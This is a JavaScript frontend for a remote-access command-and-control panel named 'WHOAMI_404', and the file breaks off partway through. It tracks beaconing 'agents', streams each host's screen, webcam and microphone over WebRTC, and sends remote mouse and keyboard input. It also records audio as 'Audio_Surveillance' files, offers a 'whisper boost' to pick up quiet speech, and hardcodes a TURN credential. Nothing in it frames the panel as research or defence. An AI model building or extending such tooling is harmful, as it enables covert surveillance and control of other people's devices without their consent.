/* ═══════════════════════════════════════════════════════════
   WHOAMI_404 C2 PANEL — Frontend Controller
   Real-time operations panel with Socket.IO, context menus,
   toasts, notifications, agent management, and rich UI.
   ═══════════════════════════════════════════════════════════ */

(() => {
    'use strict';

    // ──────── STATE ────────
    const state = {
        agents: {},
        selectedAgentId: null,
        remoteControlActive: false,

        sessionStart: Date.now(),
        notifCount: 0,
        notifications: [],
        currentFilter: 'all',
        wsConnected: false,
        commandHistory: [],
        historyIndex: -1,
    };

    // ──────── CUSTOM CYBER MODAL SYSTEM ────────
    function showCustomConfirm(options = {}) {
        return new Promise((resolve) => {
            const backdrop = document.getElementById('custom-modal-backdrop');
            const iconBadge = document.getElementById('c-modal-icon-badge');
            const iconEl = document.getElementById('c-modal-icon');
            const titleEl = document.getElementById('c-modal-title');
            const subtitleEl = document.getElementById('c-modal-subtitle');
            const messageEl = document.getElementById('c-modal-message');
            const inputWrap = document.getElementById('c-modal-input-wrap');
            const totpWrap = document.getElementById('c-modal-totp-wrap');
            const totpInput = document.getElementById('c-modal-totp-input');
            const totpError = document.getElementById('c-modal-totp-error');
            const confirmBtn = document.getElementById('c-modal-confirm-btn');
            const cancelBtn = document.getElementById('c-modal-cancel-btn');
            const closeBtn = document.getElementById('c-modal-close-btn');

            if (!backdrop) {
                resolve(window.confirm(options.message || 'Are you sure?'));
                return;
            }

            const title = options.title || 'Confirm Action';
            const subtitle = options.subtitle || 'System Action';
            const message = options.message || 'Are you sure you want to proceed?';
            const icon = options.icon || (options.isDanger ? 'ph-warning' : 'ph-question');
            const confirmText = options.confirmText || 'Confirm';
            const isDanger = options.isDanger || false;
            const requireTotp = options.requireTotp || false;

            titleEl.textContent = title;
            subtitleEl.textContent = subtitle;
            messageEl.textContent = message;
            iconEl.className = `ph-bold ${icon}`;
            inputWrap.style.display = 'none';

            async function checkTotpRequirement() {
                if (requireTotp) {
                    try {
                        const statusRes = await fetch('/api/totp/status');
                        const statusData = await statusRes.json();
                        if (statusData && statusData.setup_complete) {
                            totpWrap.style.display = 'block';
                            totpInput.value = '';
                            totpError.style.display = 'none';
                            totpError.textContent = '';
                            setTimeout(() => totpInput.focus(), 50);
                            return true;
                        }
                    } catch (e) { }
                    // 2FA is not configured or setup complete: hide 2FA input
                    totpWrap.style.display = 'none';
                    return false;
                } else {
                    totpWrap.style.display = 'none';
                    return false;
                }
            }

            let isTotpRequired = false;
            checkTotpRequirement().then(req => { isTotpRequired = req; });

            if (isDanger) {
                iconBadge.className = 'c-modal-icon-badge danger';
                confirmBtn.className = 'f-action-pill danger';
            } else {
                iconBadge.className = 'c-modal-icon-badge';
                confirmBtn.className = 'f-action-pill primary';
            }
            confirmBtn.textContent = confirmText;

            backdrop.style.display = 'flex';

            function cleanup(result) {
                backdrop.style.display = 'none';
                totpWrap.style.display = 'none';
                confirmBtn.removeEventListener('click', onConfirm);
                cancelBtn.removeEventListener('click', onCancel);
                closeBtn.removeEventListener('click', onCancel);
                document.removeEventListener('keydown', onKeyDown);
                resolve(result);
            }

            async function onConfirm() {
                if (requireTotp && isTotpRequired) {
                    const code = totpInput.value.trim();
                    if (!code || code.length !== 6) {
                        totpError.textContent = 'Enter valid 6-digit Google Authenticator code';
                        totpError.style.display = 'block';
                        totpInput.focus();
                        return;
                    }
                    confirmBtn.disabled = true;
                    confirmBtn.textContent = 'Verifying...';
                    try {
                        const res = await fetch('/api/totp/verify', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                                'X-CSRFToken': getCsrfToken()
                            },
                            body: JSON.stringify({ code })
                        });
                        const data = await res.json();
                        confirmBtn.disabled = false;
                        confirmBtn.textContent = confirmText;

                        if (res.ok && data.success) {
                            showToast('success', 'Google Authenticator code verified!');
                            cleanup(true);
                        } else {
                            totpError.textContent = data.error || 'Invalid 2FA Authenticator Code';
                            totpError.style.display = 'block';
                            showToast('error', data.error || 'Invalid 2FA Authenticator Code');
                            totpInput.select();
                        }
                    } catch (err) {
                        confirmBtn.disabled = false;
                        confirmBtn.textContent = confirmText;
                        totpError.textContent = 'Verification error. Try again.';
                        totpError.style.display = 'block';
                    }
                } else {
                    cleanup(true);
                }
            }

            function onCancel() { cleanup(false); }
            function onKeyDown(e) {
                if (e.key === 'Escape') cleanup(false);
                if (e.key === 'Enter') onConfirm();
            }

            confirmBtn.addEventListener('click', onConfirm);
            cancelBtn.addEventListener('click', onCancel);
            closeBtn.addEventListener('click', onCancel);
            document.addEventListener('keydown', onKeyDown);
        });
    }

    function showCustomPrompt(options = {}) {
        return new Promise((resolve) => {
            const backdrop = document.getElementById('custom-modal-backdrop');
            const iconBadge = document.getElementById('c-modal-icon-badge');
            const iconEl = document.getElementById('c-modal-icon');
            const titleEl = document.getElementById('c-modal-title');
            const subtitleEl = document.getElementById('c-modal-subtitle');
            const messageEl = document.getElementById('c-modal-message');
            const inputWrap = document.getElementById('c-modal-input-wrap');
            const inputEl = document.getElementById('c-modal-input');
            const confirmBtn = document.getElementById('c-modal-confirm-btn');
            const cancelBtn = document.getElementById('c-modal-cancel-btn');
            const closeBtn = document.getElementById('c-modal-close-btn');

            if (!backdrop) {
                resolve(window.prompt(options.message || 'Enter value:', options.defaultValue || ''));
                return;
            }

            const title = options.title || 'Input Required';
            const subtitle = options.subtitle || 'System Action';
            const message = options.message || 'Please enter value:';
            const defaultValue = options.defaultValue || '';
            const icon = options.icon || 'ph-pencil-simple';
            const confirmText = options.confirmText || 'Submit';

            titleEl.textContent = title;
            subtitleEl.textContent = subtitle;
            messageEl.textContent = message;
            iconEl.className = `ph-bold ${icon}`;
            iconBadge.className = 'c-modal-icon-badge';
            confirmBtn.className = 'f-action-pill primary';
            confirmBtn.textContent = confirmText;

            inputWrap.style.display = 'block';
            inputEl.value = defaultValue;

            backdrop.style.display = 'flex';

            setTimeout(() => {
                inputEl.focus();
                inputEl.select();
            }, 50);

            function cleanup(result) {
                backdrop.style.display = 'none';
                confirmBtn.removeEventListener('click', onConfirm);
                cancelBtn.removeEventListener('click', onCancel);
                closeBtn.removeEventListener('click', onCancel);
                document.removeEventListener('keydown', onKeyDown);
                resolve(result);
            }

            function onConfirm() { cleanup(inputEl.value); }
            function onCancel() { cleanup(null); }
            function onKeyDown(e) {
                if (e.key === 'Escape') cleanup(null);
                if (e.key === 'Enter') cleanup(inputEl.value);
            }

            confirmBtn.addEventListener('click', onConfirm);
            cancelBtn.addEventListener('click', onCancel);
            closeBtn.addEventListener('click', onCancel);
            document.addEventListener('keydown', onKeyDown);
        });
    }

    // ──────── SOCKET.IO ────────
    const socket = io();

    function fetchAgents(silent = false) {
        fetch('/api/agents')
            .then(r => r.json())
            .then(data => {
                if (Array.isArray(data)) {
                    data.forEach(a => {
                        state.agents[a.agent_id] = a;
                    });
                    renderAgentList();
                    updateCounters();
                    if (state.selectedAgentId && state.agents[state.selectedAgentId]) {
                        renderAgentDataView(state.agents[state.selectedAgentId]);
                        renderAgentStats(state.agents[state.selectedAgentId]);
                    }
                    if (!silent) {
                        showToast('info', `Synchronized ${data.length} device(s)`);
                    }
                }
            })
            .catch(err => {
                console.warn("fetchAgents notice:", err);
            });
    }

    socket.on('connect', () => {
        state.wsConnected = true;
        updateWsStatus(true);
        addLog('system', 'WebSocket connected');
        showToast('info', 'Connected to WHOAMI_404 server');
        fetchAgents(true);
    });


    socket.on('disconnect', () => {
        state.wsConnected = false;
        updateWsStatus(false);
        addLog('system', 'WebSocket disconnected');
        showToast('error', 'Connection lost — reconnecting...');
    });

    socket.on('agent_update', (agent) => {
        const isNew = !state.agents[agent.agent_id];
        state.agents[agent.agent_id] = agent;
        renderAgentList();
        updateCounters();

        if (isNew) {
            addLog('agent', `New agent beacon: ${agent.hostname} (${agent.agent_id.slice(0, 8)})`);
            showToast('success', `Agent connected: ${agent.hostname}`);
            addNotification('New Agent', `${agent.hostname} (${agent.os}) checked in`);
        }

        // If this is the selected agent, refresh data view
        if (state.selectedAgentId === agent.agent_id) {
            renderAgentDataView(agent);
            renderAgentStats(agent);
        }
    });


    // ──────── WEBRTC MEDIA CLIENT MANAGEMENT ────────
    const activeWebRTC = {
        screen: { pc: null, dataChannel: null, timer: null, level: 3, badCount: 0, goodCount: 0, prevLoss: 0, prevReceived: 0, prevBytes: 0, prevTimestamp: 0 },
        camera: { pc: null, timer: null, level: 3, badCount: 0, goodCount: 0, prevLoss: 0, prevReceived: 0, prevBytes: 0, prevTimestamp: 0 },
        audio: { pc: null, timer: null }
    };

    let screenFpsInterval = null;
    let screenFrameCount = 0;
    let cameraFpsInterval = null;
    let cameraFrameCount = 0;
    // ──────── ADVANCED STUDIO WEBAUDIO DSP ENGINE ────────
    class StudioAudioController {
        constructor() {
            this.ctx = null;
            this.sourceNode = null;
            this.highPassFilter = null;
            this.lowPassFilter = null;
            this.eqLow = null;
            this.eqMid = null;
            this.eqHigh = null;
            this.compressor = null;
            this.gainNode = null;
            this.analyser = null;
            this.mediaRecorder = null;
            this.recordedChunks = [];
            this.isRecording = false;
            this.animFrameId = null;
            this.currentMode = 'studio';
        }

        initAudioContext() {
            if (!this.ctx) {
                const AudioCtx = window.AudioContext || window.webkitAudioContext;
                this.ctx = new AudioCtx({ latencyHint: 'interactive', sampleRate: 48000 });

                // 1. High-Pass DC & Sub-Rumble Filter (80Hz)
                this.highPassFilter = this.ctx.createBiquadFilter();
                this.highPassFilter.type = 'highpass';
                this.highPassFilter.frequency.value = 80;
                this.highPassFilter.Q.value = 0.707;

                // 2. Low-Pass Anti-Aliasing & Hiss Filter (8500Hz)
                this.lowPassFilter = this.ctx.createBiquadFilter();
                this.lowPassFilter.type = 'lowpass';
                this.lowPassFilter.frequency.value = 8500;

                // 3. 3-Band Parametric Vocal Equalizer
                this.eqLow = this.ctx.createBiquadFilter();
                this.eqLow.type = 'lowshelf';
                this.eqLow.frequency.value = 250;
                this.eqLow.gain.value = 0;

                this.eqMid = this.ctx.createBiquadFilter();
                this.eqMid.type = 'peaking';
                this.eqMid.frequency.value = 2500; // Human Speech Intelligibility Zone
                this.eqMid.gain.value = 3;
                this.eqMid.Q.value = 1.2;

                this.eqHigh = this.ctx.createBiquadFilter();
                this.eqHigh.type = 'highshelf';
                this.eqHigh.frequency.value = 6000;
                this.eqHigh.gain.value = 0;

                // 4. Studio Vocal Compressor
                this.compressor = this.ctx.createDynamicsCompressor();
                this.compressor.threshold.setValueAtTime(-22, this.ctx.currentTime);
                this.compressor.knee.setValueAtTime(12, this.ctx.currentTime);
                this.compressor.ratio.setValueAtTime(6, this.ctx.currentTime);
                this.compressor.attack.setValueAtTime(0.005, this.ctx.currentTime);
                this.compressor.release.setValueAtTime(0.18, this.ctx.currentTime);

                // 5. Master Output Gain
                this.gainNode = this.ctx.createGain();
                const boostFactor = parseFloat(document.getElementById('audio-volume-boost')?.value || '1.0');
                this.gainNode.gain.value = boostFactor;

                // 6. Fast Real-Time FFT Analyser
                this.analyser = this.ctx.createAnalyser();
                this.analyser.fftSize = 256;
                this.analyser.smoothingTimeConstant = 0.8;

                // Build Single-Route WebAudio Graph to Single Destination (Zero-Echo)
                this.highPassFilter.connect(this.lowPassFilter);
                this.lowPassFilter.connect(this.eqLow);
                this.eqLow.connect(this.eqMid);
                this.eqMid.connect(this.eqHigh);
                this.eqHigh.connect(this.compressor);
                this.compressor.connect(this.gainNode);
                this.gainNode.connect(this.analyser);
                this.analyser.connect(this.ctx.destination);
            }

            if (this.ctx.state === 'suspended') {
                this.ctx.resume();
            }
        }

        attachMediaStream(mediaStream) {
            this.initAudioContext();
            if (this.sourceNode) {
                try { this.sourceNode.disconnect(); } catch (e) { }
            }
            this.sourceNode = this.ctx.createMediaStreamSource(mediaStream);
            this.sourceNode.connect(this.highPassFilter);
            this.startVisualizer();
        }

        setDspMode(mode) {
            this.currentMode = mode;
            if (!this.ctx) return;
            const now = this.ctx.currentTime;

            switch (mode) {
                case 'whisper': // Forensic Whisper Boost
                    this.highPassFilter.frequency.setValueAtTime(150, now);
                    this.lowPassFilter.frequency.setValueAtTime(7500, now);
                    this.eqLow.gain.setValueAtTime(-6, now);
                    this.eqMid.gain.setValueAtTime(9, now);      // Heavily boost vocal formants
                    this.eqHigh.gain.setValueAtTime(4, now);
                    this.compressor.threshold.setValueAtTime(-34, now);
                    this.compressor.ratio.setValueAtTime(12, now);
                    break;

                case 'gate': // Aggressive Noise Gate
                    this.highPassFilter.frequency.setValueAtTime(120, now);
                    this.lowPassFilter.frequency.setValueAtTime(6000, now);
                    this.eqLow.gain.setValueAtTime(-2, now);
                    this.eqMid.gain.setValueAtTime(2, now);
                    this.eqHigh.gain.setValueAtTime(-4, now);
                    this.compressor.threshold.setValueAtTime(-18, now);
                    this.compressor.ratio.setValueAtTime(8, now);
                    break;

                case 'raw': // Direct Unfiltered Flat Hi-Fi
                    this.highPassFilter.frequency.setValueAtTime(20, now);
                    this.lowPassFilter.frequency.setValueAtTime(20000, now);
                    this.eqLow.gain.setValueAtTime(0, now);
                    this.eqMid.gain.setValueAtTime(0, now);
                    this.eqHigh.gain.setValueAtTime(0, now);
                    this.compressor.threshold.setValueAtTime(0, now);
                    this.compressor.ratio.setValueAtTime(1, now);
                    break;

                case 'studio':
                default: // Studio Clean Balance
                    this.highPassFilter.frequency.setValueAtTime(80, now);
                    this.lowPassFilter.frequency.setValueAtTime(8500, now);
                    this.eqLow.gain.setValueAtTime(0, now);
                    this.eqMid.gain.setValueAtTime(3, now);
                    this.eqHigh.gain.setValueAtTime(0, now);
                    this.compressor.threshold.setValueAtTime(-22, now);
                    this.compressor.ratio.setValueAtTime(6, now);
                    break;
            }
        }

        setVolumeBoost(factor) {
            if (this.gainNode && this.ctx) {
                this.gainNode.gain.setValueAtTime(factor, this.ctx.currentTime);
            }
        }

        startVisualizer() {
            const canvas = document.getElementById('audio-visualizer-canvas');
            if (!canvas) return;
            const ctx2d = canvas.getContext('2d');
            const bufferLength = this.analyser.frequencyBinCount;
            const dataArray = new Uint8Array(bufferLength);
            const peakMeter = document.getElementById('audio-peak-meter-fill');
            const dbText = document.getElementById('audio-db-meter-text');

            if (this.animFrameId) cancelAnimationFrame(this.animFrameId);

            // Smoothed bar heights for 9 voice capsule bars
            if (!this.barHeights || this.barHeights.length !== 9) {
                this.barHeights = [10, 18, 30, 16, 52, 40, 24, 18, 12];
            }

            const draw = () => {
                this.animFrameId = requestAnimationFrame(draw);
                this.analyser.getByteFrequencyData(dataArray);

                // Calculate Peak dBFS for telemetry
                let peak = 0;
                for (let i = 0; i < bufferLength; i++) {
                    if (dataArray[i] > peak) peak = dataArray[i];
                }
                const peakPercent = Math.min(100, Math.round((peak / 255) * 100));
                const dB = peak > 0 ? (20 * Math.log10(peak / 255)).toFixed(1) : '-96.0';

                if (peakMeter) {
                    peakMeter.style.width = `${peakPercent}%`;
                    peakMeter.style.background = peakPercent > 85 ? '#ef4444' : (peakPercent > 60 ? '#eab308' : '#a855f7');
                }
                if (dbText) {
                    dbText.textContent = `${dB} dBFS`;
                }

                ctx2d.clearRect(0, 0, canvas.width, canvas.height);

                // 9 Voice Capsule Equalizer Bars Configuration
                const numBars = 9;
                const barWidth = 7;
                const barGap = 12;
                const totalWidth = (numBars * barWidth) + ((numBars - 1) * barGap);
                const startX = (canvas.width - totalWidth) / 2;
                const centerY = canvas.height / 2;
                const maxBarHeight = canvas.height * 0.75;
                const minBarHeight = 8; // capsule dot height

                // Frequency band ranges mapped to vocal formants (~100Hz - 7500Hz)
                const bandRanges = [
                    [2, 4],    // Bar 0: Low bass
                    [5, 8],    // Bar 1: Warmth
                    [9, 14],   // Bar 2: Mid-low
                    [15, 22],  // Bar 3: Lower vocal
                    [23, 38],  // Bar 4: Vocal core / pitch (center bar)
                    [39, 52],  // Bar 5: Intelligibility
                    [53, 68],  // Bar 6: Clarity
                    [71, 85],  // Bar 7: Presence
                    [86, 105]  // Bar 8: Air
                ];

                for (let i = 0; i < numBars; i++) {
                    const [start, end] = bandRanges[i];
                    let sum = 0;
                    let count = 0;
                    for (let j = start; j <= end && j < bufferLength; j++) {
                        sum += dataArray[j];
                        count++;
                    }
                    const avg = count > 0 ? sum / count : 0;

                    let target = (avg / 255) * maxBarHeight;
                    if (target < minBarHeight) {
                        target = minBarHeight + Math.sin(Date.now() * 0.003 + i) * 2;
                    }

                    // Smooth Lerp animation
                    this.barHeights[i] += (target - this.barHeights[i]) * 0.22;
                    const h = Math.max(minBarHeight, Math.min(maxBarHeight, this.barHeights[i]));

                    const x = startX + i * (barWidth + barGap);
                    const y = centerY - h / 2;

                    ctx2d.save();

                    // Neon Purple Ambient Glow
                    ctx2d.shadowColor = 'rgba(168, 85, 247, 0.9)';
                    ctx2d.shadowBlur = 14;

                    // Rich Violet / Magenta linear gradient
                    const grad = ctx2d.createLinearGradient(0, y + h, 0, y);
                    grad.addColorStop(0, '#7e22ce');
                    grad.addColorStop(0.5, '#a855f7');
                    grad.addColorStop(1, '#c084fc');

                    ctx2d.fillStyle = grad;

                    // Draw pill shape (rounded rectangle)
                    ctx2d.beginPath();
                    const radius = barWidth / 2;
                    if (typeof ctx2d.roundRect === 'function') {
                        ctx2d.roundRect(x, y, barWidth, h, radius);
                    } else {
                        ctx2d.moveTo(x + radius, y);
                        ctx2d.arcTo(x + barWidth, y, x + barWidth, y + h, radius);
                        ctx2d.arcTo(x + barWidth, y + h, x, y + h, radius);
                        ctx2d.arcTo(x, y + h, x, y, radius);
                        ctx2d.arcTo(x, y, x + barWidth, y, radius);
                    }
                    ctx2d.fill();
                    ctx2d.restore();
                }
            };
            draw();
        }

        startRecording() {
            if (!this.ctx || !this.gainNode) return false;
            try {
                const dest = this.ctx.createMediaStreamDestination();
                this.gainNode.connect(dest);

                this.recordedChunks = [];
                const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' : 'audio/webm';
                this.mediaRecorder = new MediaRecorder(dest.stream, { mimeType });
                this.mediaRecorder.ondataavailable = (e) => {
                    if (e.data && e.data.size > 0) this.recordedChunks.push(e.data);
                };
                this.mediaRecorder.onstop = () => {
                    const blob = new Blob(this.recordedChunks, { type: mimeType });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.style.display = 'none';
                    a.href = url;
                    a.download = `Audio_Surveillance_${new Date().toISOString().replace(/[:.]/g, '-')}.webm`;
                    document.body.appendChild(a);
                    a.click();
                    setTimeout(() => {
                        if (document.body.contains(a)) document.body.removeChild(a);
                        URL.revokeObjectURL(url);
                    }, 2000);
                };
                this.mediaRecorder.start(500);
                this.isRecording = true;
                return true;
            } catch (e) {
                console.error("Recording start error:", e);
                return false;
            }
        }

        stopRecording() {
            if (this.mediaRecorder && this.isRecording) {
                try { this.mediaRecorder.stop(); } catch (e) { }
                this.isRecording = false;
            }
        }

        stop() {
            if (this.animFrameId) {
                cancelAnimationFrame(this.animFrameId);
                this.animFrameId = null;
            }
            if (this.isRecording) this.stopRecording();
            if (this.sourceNode) {
                try { this.sourceNode.disconnect(); } catch (e) { }
                this.sourceNode = null;
            }
            if (this.ctx) {
                try { this.ctx.close(); } catch (e) { }
                this.ctx = null;
            }
        }
    }

    const studioAudio = new StudioAudioController();

    function applyAudioDspMode(mode) {
        studioAudio.setDspMode(mode);
        if (state.selectedAgentId && activeWebRTC.audio.pc) {
            socket.emit('update_stream_params', {
                agent_id: state.selectedAgentId,
                stream_type: 'audio',
                dsp_mode: mode
            });
        }
    }

    const vpsHost = window.location.hostname || '127.0.0.1';
    const iceServers = [
        { urls: 'stun:stun.l.google.com:19302' },
        { urls: 'stun:stun1.l.google.com:19302' },
        { urls: `stun:${vpsHost}:3478` },
        { urls: `turn:${vpsHost}:3478`, username: 'c2user', credential: 'c2password' }
    ];

    function startTelemetryMonitor(streamType) {
        if (streamType === 'audio') return;
        const entry = activeWebRTC[streamType];
        if (!entry) return;
        if (entry.timer) clearInterval(entry.timer);

        entry.level = 3;
        entry.badCount = 0;
        entry.goodCount = 0;
        entry.prevLoss = 0;
        entry.prevReceived = 0;
        entry.prevBytes = 0;
        entry.prevTimestamp = performance.now();

        entry.timer = setInterval(async () => {
            if (!entry.pc) return;
            try {
                const stats = await entry.pc.getStats();
                let packetsLost = 0;
                let packetsReceived = 0;
                let bytesReceived = 0;
                let currentFps = 0;
                let rtt = 0;

                stats.forEach(report => {
                    if (report.type === 'inbound-rtp' && (report.kind === 'video' || report.mediaType === 'video')) {
                        packetsLost = report.packetsLost || 0;
                        packetsReceived = report.packetsReceived || 0;
                        bytesReceived = report.bytesReceived || 0;
                        if (report.framesPerSecond) currentFps = Math.round(report.framesPerSecond);
                    }
                    if (report.type === 'candidate-pair' && report.state === 'succeeded') {
                        rtt = (report.currentRoundTripTime || 0) * 1000;
                    }
                });

                const now = performance.now();
                const timeDelta = (now - (entry.prevTimestamp || now)) / 1000;
                if (timeDelta > 0 && entry.prevBytes > 0 && bytesReceived >= entry.prevBytes) {
                    const mbps = (((bytesReceived - entry.prevBytes) * 8) / (1000 * 1000 * timeDelta)).toFixed(1);
                    const bitrateBadge = document.getElementById(`${streamType}-bitrate-badge`);
                    if (bitrateBadge) {
                        bitrateBadge.textContent = `${mbps} Mbps`;
                        bitrateBadge.style.display = 'inline-block';
                    }
                }
                entry.prevBytes = bytesReceived;
                entry.prevTimestamp = now;

                if (currentFps > 0) {
                    const fpsEl = document.getElementById(`${streamType}-fps-live`);
                    if (fpsEl) {
                        fpsEl.textContent = `${currentFps} FPS`;
                        fpsEl.style.color = '#4ade80';
                    }
                }

                const deltaLoss = Math.max(0, packetsLost - entry.prevLoss);
                const deltaReceived = Math.max(0, packetsReceived - entry.prevReceived);
                entry.prevLoss = packetsLost;
                entry.prevReceived = packetsReceived;

                const totalPackets = deltaLoss + deltaReceived;
                const lossRate = totalPackets > 0 ? (deltaLoss / totalPackets) * 100 : 0;

                updateQualityBadge(streamType, entry.level, lossRate, rtt);

                // GCC Adaptive State Machine Decision (Only adapt if severe loss > 20% or RTT > 600ms)
                if (lossRate > 20 || rtt > 600) {
                    entry.badCount++;
                    entry.goodCount = 0;
                    if (entry.badCount >= 3 && entry.level > 1) {
                        entry.level--;
                        entry.badCount = 0;
                        applyQualityTier(streamType, entry.level);
                    }
                } else if (lossRate < 2 && rtt < 120) {
                    entry.goodCount++;
                    entry.badCount = 0;
                    if (entry.goodCount >= 5 && entry.level < 3) {
                        entry.level++;
                        entry.goodCount = 0;
                        applyQualityTier(streamType, entry.level);
                    }
                }
            } catch (e) {
                console.error("Telemetry report error:", e);
            }
        }, 1200);
    }

    // ──────── INTERACTIVE REMOTE INPUT ENGINE ────────
    function getNormalizedVideoCoordinates(e, videoEl) {
        if (!videoEl) return null;
        const rect = videoEl.getBoundingClientRect();
        const videoWidth = videoEl.videoWidth || 1920;
        const videoHeight = videoEl.videoHeight || 1080;
        const elementWidth = rect.width;
        const elementHeight = rect.height;

        if (elementWidth <= 0 || elementHeight <= 0) return null;

        const videoRatio = videoWidth / videoHeight;
        const elementRatio = elementWidth / elementHeight;

        let renderedWidth = elementWidth;
        let renderedHeight = elementHeight;
        let offsetX = 0;
        let offsetY = 0;

        if (elementRatio > videoRatio) {
            // Pillarboxed (black bars left and right)
            renderedWidth = elementHeight * videoRatio;
            offsetX = (elementWidth - renderedWidth) / 2;
        } else {
            // Letterboxed (black bars top and bottom)
            renderedHeight = elementWidth / videoRatio;
            offsetY = (elementHeight - renderedHeight) / 2;
        }

        const clickX = e.clientX - rect.left - offsetX;
        const clickY = e.clientY - rect.top - offsetY;

        if (clickX < 0 || clickX > renderedWidth || clickY < 0 || clickY > renderedHeight) {
            return null; // Interaction inside letterbox margin
        }

        const xRatio = Math.max(0.0, Math.min(1.0, clickX / renderedWidth));
        const yRatio = Math.max(0.0, Math.min(1.0, clickY / renderedHeight));
        return { x: xRatio, y: yRatio };
    }

    function sendRemoteInput(payload) {
        if (!state.selectedAgentId || !state.remoteControlActive) return;
        const dataChannel = activeWebRTC['screen']?.dataChannel;
        if (dataChannel && dataChannel.readyState === 'open') {
            try {
                dataChannel.send(JSON.stringify(payload));
                return;
            } catch (e) {
                console.warn("DataChannel send notice:", e);
            }
        }
        socket.emit('remote_input', {
            agent_id: state.selectedAgentId,
            ...payload
        });
    }

    function applyQualityTier(streamType, level) {
        let width = 1920;
        let fps = 25;
        let label = 'HD (1080p)';

        if (level === 2) {
            width = 1280;
            fps = 20;
            label = 'MD (720p)';
        } else if (level === 1) {
            width = 854;
            fps = 15;
            label = 'SD (480p)';
        }

        showToast('info', `GCC Adaptation: Shifted ${streamType} to ${label}`);
        addLog(streamType, `WebRTC GCC: Dynamically scaled stream quality to ${label} (${width}px, ${fps}FPS)`);

        if (state.selectedAgentId) {
            socket.emit('update_stream_params', {
                agent_id: state.selectedAgentId,
                stream_type: streamType,
                target_width: width,
                fps: fps
            });
        }
    }

    function updateQualityBadge(streamType, level, lossRate, rtt) {
        const badge = document.getElementById(`${streamType}-quality-badge`);
        if (!badge) return;
        badge.style.display = 'inline-flex';

        let text = 'HD (1080p)';
        let color = '#4ade80';
        let bg = 'rgba(74,222,128,0.15)';

        if (level === 2) {
            text = 'MD (720p)';
            color = '#fbbf24';
            bg = 'rgba(251,191,36,0.15)';
        } else if (level === 1) {
            text = 'SD (480p)';
            color = '#f87171';
            bg = 'rgba(248,113,113,0.15)';
        }

        badge.innerHTML = `<i class="ph-bold ph-lightning"></i> ${text} · ${lossRate.toFixed(1)}% loss · ${Math.round(rtt)}ms`;
        badge.style.color = color;
        badge.style.background = bg;
    }

    async function startWebRTCStream(streamType, params = {}) {
        if (!state.selectedAgentId) {
            showToast('warning', 'Select an agent first');
            return;
        }

        stopWebRTCStream(streamType);

        try {
            const pc = new RTCPeerConnection({ iceServers });
            activeWebRTC[streamType].pc = pc;

            if (streamType === 'audio') {
                pc.addTransceiver('audio', { direction: 'recvonly' });
            } else {
                const videoTransceiver = pc.addTransceiver('video', { direction: 'recvonly' });
                // Prioritize H.264 High Profile (640032, 64002a, 64001f) and Main Profile
                if (typeof RTCRtpReceiver.getCapabilities === 'function') {
                    const capabilities = RTCRtpReceiver.getCapabilities('video');
                    if (capabilities && capabilities.codecs) {
                        const highProfileH264 = capabilities.codecs.filter(c => 
                            c.mimeType.toLowerCase() === 'video/h264' && 
                            (c.sdpFmtpLine?.includes('profile-level-id=6400') || c.sdpFmtpLine?.includes('profile-level-id=4d00'))
                        );
                        const otherCodecs = capabilities.codecs.filter(c => !highProfileH264.includes(c));
                        const prioritizedCodecs = [...highProfileH264, ...otherCodecs];
                        try {
                            videoTransceiver.setCodecPreferences(prioritizedCodecs);
                        } catch (prefErr) {
                            console.warn('Failed to set codec preferences:', prefErr);
                        }
                    }
                }
            }

            pc.ontrack = (event) => {
                if (event.receiver && 'playoutDelayHint' in event.receiver) {
                    event.receiver.playoutDelayHint = 0; // Zero playout delay on receiver
                }
                const stream = event.streams[0] || new MediaStream([event.track]);
                if (streamType === 'screen') {
                    const videoEl = document.getElementById('screen-video');
                    const placeholder = document.getElementById('screen-placeholder');
                    if (videoEl) {
                        videoEl.srcObject = stream;
                        videoEl.muted = true;
                        videoEl.playsInline = true;
                        videoEl.autoplay = true;
                        if ('playoutDelayHint' in videoEl) {
                            videoEl.playoutDelayHint = 0; // Zero latency buffer
                        }
                        videoEl.style.display = 'block';
                        videoEl.play().catch(console.error);

                        if ('requestVideoFrameCallback' in videoEl) {
                            const onFrame = () => {
                                screenFrameCount++;
                                if (activeWebRTC.screen.pc) {
                                    videoEl.requestVideoFrameCallback(onFrame);
                                }
                            };
                            videoEl.requestVideoFrameCallback(onFrame);
                        }

                        if (screenFpsInterval) clearInterval(screenFpsInterval);
                        screenFrameCount = 0;
                        screenFpsInterval = setInterval(() => {
                            const fpsEl = document.getElementById('screen-fps-live');
                            if (fpsEl) {
                                fpsEl.textContent = `${screenFrameCount} FPS`;
                                fpsEl.style.color = screenFrameCount > 0 ? '#4ade80' : 'var(--text-muted)';
                            }
                            screenFrameCount = 0;
                        }, 1000);
                    }
                    if (placeholder) placeholder.style.display = 'none';
                } else if (streamType === 'camera') {
                    const videoEl = document.getElementById('camera-video');
                    const placeholder = document.getElementById('camera-placeholder');
                    if (videoEl) {
                        videoEl.srcObject = stream;
                        videoEl.muted = true;
                        videoEl.playsInline = true;
                        videoEl.autoplay = true;
                        if ('playoutDelayHint' in videoEl) {
                            videoEl.playoutDelayHint = 0; // Zero latency buffer
                        }
                        videoEl.style.display = 'block';
                        videoEl.play().catch(console.error);

                        if ('requestVideoFrameCallback' in videoEl) {
                            const onCameraFrame = () => {
                                cameraFrameCount++;
                                if (activeWebRTC.camera.pc) {
                                    videoEl.requestVideoFrameCallback(onCameraFrame);
                                }
                            };
                            videoEl.requestVideoFrameCallback(onCameraFrame);
                        }

                        if (cameraFpsInterval) clearInterval(cameraFpsInterval);
                        cameraFrameCount = 0;
                        cameraFpsInterval = setInterval(() => {
                            const fpsEl = document.getElementById('camera-fps-live');
                            if (fpsEl) {
                                fpsEl.textContent = `${cameraFrameCount} FPS`;
                                fpsEl.style.color = cameraFrameCount > 0 ? '#4ade80' : 'var(--text-muted)';
                            }
                            cameraFrameCount = 0;
                        }, 1000);
                    }
                    if (placeholder) placeholder.style.display = 'none';
                } else if (streamType === 'audio') {
                    const audioEl = document.getElementById('audio-player');
                    if (audioEl) {
                        audioEl.srcObject = stream;
                        audioEl.autoplay = true;
                        // Mute <audio> HTML element so sound routes EXCLUSIVELY through WebAudio API graph
                        // This guarantees ZERO dual-playback acoustic echo!
                        audioEl.muted = true;
                        if ('playoutDelayHint' in audioEl) {
                            audioEl.playoutDelayHint = 0; // Zero audio buffer latency
                        }
                        audioEl.play().catch(console.error);
                    }

